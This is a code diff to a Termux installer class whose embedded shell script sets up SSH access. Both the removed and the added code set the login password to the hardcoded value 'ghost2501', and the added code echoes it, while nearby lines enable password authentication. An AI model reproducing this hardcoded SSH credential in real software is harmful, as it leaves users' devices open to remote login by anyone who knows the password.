@@ -446,14 +446,19 @@ public final class TermuxInstaller {
                 "        ssh-keygen -A 2>/dev/null\n" +
                 "    fi\n" +
                 "    \n" +
-                "    # Set password for SSH access\n" +
-                "    echo \"ghost2501\" | passwd -s 2>/dev/null || {\n" +
-                "        # Fallback: create password file directly for Termux\n" +
-                "        mkdir -p $PREFIX/etc\n" +
-                "        # Use openssl to hash the password\n" +
-                "        HASH=$(openssl passwd -6 ghost2501 2>/dev/null || openssl passwd -1 ghost2501)\n" +
-                "        echo \"$USER:$HASH:18000:0:99999:7:::\" > $PREFIX/etc/shadow 2>/dev/null\n" +
-                "    }\n" +
+                "    # Set password for SSH access using expect\n" +
+                "    if command -v expect >/dev/null 2>&1; then\n" +
+                "        expect -c '\n" +
+                "            spawn passwd\n" +
+                "            expect \"New password:\"\n" +
+                "            send \"ghost2501\\r\"\n" +
+                "            expect \"Retype new password:\"\n" +
+                "            send \"ghost2501\\r\"\n" +
+                "            expect eof\n" +
+                "        ' 2>/dev/null && echo \"✓ Password set to ghost2501\"\n" +
+                "    else\n" +
+                "        echo \"⚠ expect not found, set password manually: passwd\"\n" +
+                "    fi\n" +
                 "    \n" +
                 "    # Enable password authentication in sshd_config\n" +
                 "    SSHD_CONFIG=\"$PREFIX/etc/ssh/sshd_config\"\n" +
